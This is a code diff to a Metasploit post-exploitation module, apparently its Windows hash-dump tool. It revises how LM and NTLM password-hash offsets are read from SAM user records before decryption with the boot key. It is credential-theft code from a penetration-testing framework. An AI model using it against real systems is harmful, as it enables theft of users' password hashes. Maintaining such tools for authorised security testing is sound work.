@@ -185,28 +185,19 @@ class Metasploit3 < Msf::Post
 		users.each_key do |rid|
 			user = users[rid]
 
-			hashlm_off = nil
-			hashnt_off = nil
-			hashlm_enc = nil
-			hashnt_enc = nil
+			hashlm_enc = ""
+			hashnt_enc = ""
 
 			hoff = user[:V][0x9c, 4].unpack("V")[0] + 0xcc
 
-			# Lanman and NTLM hash available
-			if(hoff + 0x28 < user[:V].length)
-				hashlm_off = hoff +  4
-				hashnt_off = hoff + 24
-				hashlm_enc = user[:V][hashlm_off, 16]
-				hashnt_enc = user[:V][hashnt_off, 16]
-			# No stored lanman hash
-			elsif (hoff + 0x14 < user[:V].length)
-				hashnt_off = hoff + 8
-				hashnt_enc = user[:V][hashnt_off, 16]
-				hashlm_enc = ""
-			# No stored hashes at all
-			else
-				hashnt_enc = hashlm_enc = ""
-			end
+			#Check if hashes exist (if 20, then we've got a hash)
+			lm_exists = user[:V][0x9c+4,4].unpack("V")[0] == 20 ? true : false
+			nt_exists = user[:V][0x9c+16,4].unpack("V")[0] == 20 ? true : false
+
+			#If we have a hashes, then parse them (Note: NT is dependant on LM)
+			hashlm_enc = user[:V][hoff + 4, 16] if lm_exists
+			hashnt_enc = user[:V][(hoff + (lm_exists ? 24 : 8)), 16] if nt_exists
+
 			user[:hashlm] = decrypt_user_hash(rid, hbootkey, hashlm_enc, @sam_lmpass)
 			user[:hashnt] = decrypt_user_hash(rid, hbootkey, hashnt_enc, @sam_ntpass)
 		end
